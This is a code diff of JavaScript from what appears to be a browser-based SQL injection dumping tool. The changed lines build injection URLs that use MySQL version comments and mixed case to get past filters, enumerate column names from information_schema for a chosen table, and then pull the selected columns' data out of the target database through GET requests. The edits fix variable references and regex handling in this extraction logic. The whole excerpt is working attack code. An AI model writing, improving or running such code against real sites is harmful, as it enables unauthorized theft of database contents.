@@ -240,7 +240,7 @@ $(document).ready(function () {
         })
 
         urlinjection = urlinjection.replace('{::}', PayloadConcat('column_name'))
-        urlinjection = urlinjection.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table)})+--+-`)
+        urlinjection = urlinjection.replace('+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table_select)})+--+-`)
 
         let res = await $.get(urlinjection)
 
@@ -265,20 +265,20 @@ $(document).ready(function () {
                 </th>
             `)
         });
-        setData(table_select)
-        setData(table_select)
+        setData()
+        setData()
     }
 
-    async function setData(table) {
+    async function setData() {
         columns_select = columns.replace(/,/g, `,${stringtohex('{:::}')},`)
 
         let urlinjection = urls
         urlinjection = urlinjection.replace('{::}', PayloadConcat(columns_select))
-        urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table}+--+-`)
+        urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table_select}+--+-`)
 
         let res = await $.get(urlinjection)
 
-        m = regex.exec(res.replace(/[\n\r]/g, ""))
+        m = regex.exec(res)
 
         dataTable = m[1]
         viewData()
